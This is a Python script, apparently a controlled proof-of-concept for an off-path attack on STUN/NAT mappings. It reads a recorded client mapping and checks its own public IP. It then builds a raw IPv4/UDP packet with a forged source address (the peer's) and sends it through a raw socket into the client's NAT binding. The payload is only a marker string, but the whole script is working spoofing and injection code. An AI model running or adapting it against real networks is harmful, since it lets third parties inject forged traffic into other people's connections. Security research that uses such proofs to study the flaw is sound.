#!/usr/bin/env python3
"""Send one forged-source UDP marker to the controlled client mapping."""
import ipaddress, json, os, socket, struct, sys, time, pathlib

mapping_path = "offpath-stun-results/mapping.json"
deadline = time.time() + 300
while not pathlib.Path(mapping_path).exists() and time.time() < deadline:
    time.sleep(1)
if not pathlib.Path(mapping_path).exists():
    raise SystemExit("TIMEOUT waiting for target mapping")

m = json.loads(pathlib.Path(mapping_path).read_text())
attacker_ip = __import__("urllib.request").request.urlopen("https://api.ipify.org", timeout=10).read().decode().strip()
if attacker_ip in (m["client_public_ip"], m["peer_ip"]):
    raise SystemExit("FAIL: attacker, target, and peer must be distinct public IPs")

src_ip = ipaddress.IPv4Address(m["peer_ip"]).packed
dst_ip = ipaddress.IPv4Address(m["client_public_ip"]).packed
src_port = int(m["peer_port"])
dst_port = int(m["client_public_port"])
payload = b"OFFPATH-DELIVERY-PROOF"
udp = struct.pack("!HHHH", src_port, dst_port, 8 + len(payload), 0) + payload
total_len = 20 + len(udp)
ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 0x4D53, 0, 64, 17, 0, src_ip, dst_ip)

def checksum(buf):
    if len(buf) & 1:
        buf += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(buf) // 2), buf))
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

ip_header = ip_header[:10] + struct.pack("!H", checksum(ip_header)) + ip_header[12:]
packet = ip_header + udp

pathlib.Path("offpath-stun-results").mkdir(exist_ok=True)
identity = {
    "attacker_public_ip": attacker_ip,
    "spoofed_source": "%s:%d" % (m["peer_ip"], src_port),
    "controlled_target": "%s:%d" % (m["client_public_ip"], dst_port),
    "payload_hex": payload.hex(),
    "datagrams_sent": 1
}
pathlib.Path("offpath-stun-results/attacker.json").write_text(json.dumps(identity, indent=2) + "\n")
print("ATTACK_IDENTITY=" + json.dumps(identity, sort_keys=True), flush=True)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
sent = s.sendto(packet, (m["client_public_ip"], 0))
s.close()
if sent != len(packet):
    raise SystemExit("FAIL: short raw send %d/%d" % (sent, len(packet)))
print("RAW_SEND_ACCEPTED bytes=%d" % sent, flush=True)
time.sleep(2)
